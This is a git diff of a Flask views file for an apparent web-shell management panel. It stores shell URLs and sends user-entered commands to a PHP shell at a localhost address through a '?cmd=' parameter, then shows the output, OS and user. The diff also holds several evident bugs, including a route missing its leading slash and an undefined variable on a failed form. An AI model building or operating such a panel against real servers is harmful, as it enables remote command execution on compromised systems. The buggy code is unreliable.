@@ -3,11 +3,12 @@ from application import models
 from flask import Flask, request, flash, url_for, redirect, \
      render_template, abort, g, jsonify, current_app
 import requests
-from .forms import LoginForm, NewShell
+from .forms import LoginForm, NewShell, ShellForm
 
 errors = []
 
 @app.route('/', methods = ['GET'])
+@app.route('/index', methods=['GET'])
 def index():
   base = ''
   try:
@@ -28,6 +29,7 @@ def login():
                            form=form)
 
 @app.route('/shell', methods = ['GET'])
+@app.route('shell/<int:id>', methods = ['GET','POST'])
 def shells():
     base =''
     base = models.Base.query.all()
@@ -36,16 +38,14 @@ def shells():
 
 @app.route('/shell/new', methods = ['GET','POST'])
 def new_shell():
-    new = NewShell()
-    form = ''
-    if new.validate_on_submit():
+    form = NewShell()
+    print(str(form.shell_url.data))
+    if form.validate_on_submit():
 
         base = models.Base(shell_url = form.shell_url.data,
             shell_type = form.shell_type.data)
-
-        db.session.add(base)
-
     try:
+        db.session.add(base)
         db.session.commit()
         return redirect(url_for('index'), form=form)
     except:
@@ -56,16 +56,13 @@ def new_shell():
 
 @app.route('/shell/<int:id>', methods = ['GET','POST'])
 def shell(id):
-    base = ''
-    output = ''
-    cmd = ''
-    os = ''
+    form = ShellForm()
 
     id = models.Base.query.filter_by(id=id).first()
     base = models.Base.query.all()
 
     if request.method == 'POST':
-        cmd = request.form['cmd']
+        cmd = form['cmd']
     try:
         shell_url = 'http://localhost:8000/php_shell.php'
         shell_function = '?cmd='
@@ -83,7 +80,7 @@ def shell(id):
         output = r.text
     os = os_get.text
     user = user_get.text
-    return render_template('shell.html', output=output, cmd=cmd, id=id, base=base, os=os, user=user)
+    return render_template('shell.html', form=form)
 
 @app.route('/build', methods = ['GET','POST'])
 def build():
